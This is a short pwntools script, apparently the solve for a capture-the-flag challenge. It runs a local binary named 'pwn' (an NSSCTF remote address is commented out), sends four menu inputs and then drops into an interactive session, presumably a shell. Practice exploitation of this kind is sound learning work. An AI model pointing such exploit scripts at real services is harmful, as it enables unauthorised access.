from pwn import *

io = process("./pwn")

#io = remote("node5.anna.nssctf.cn", 26184)

io.sendline(b"3")
io.sendline(b"0")
io.sendline(b"3")
io.sendline(b"0")
io.interactive()
